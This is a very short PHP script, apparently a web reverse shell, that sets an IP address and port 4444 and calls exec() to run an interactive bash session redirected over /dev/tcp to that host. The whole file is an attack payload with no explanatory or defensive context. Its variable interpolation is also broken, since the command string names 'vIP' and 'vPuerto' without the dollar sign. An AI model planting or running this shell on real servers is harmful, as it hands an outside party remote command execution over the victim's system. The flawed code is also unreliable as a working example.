<?php
  $vIP = "192.168.1.10";
  $vPuerto = 4444;
  exec("/bin/bash -c 'bash -i >& /dev/tcp/vIP/vPuerto 0>&1'");
?>
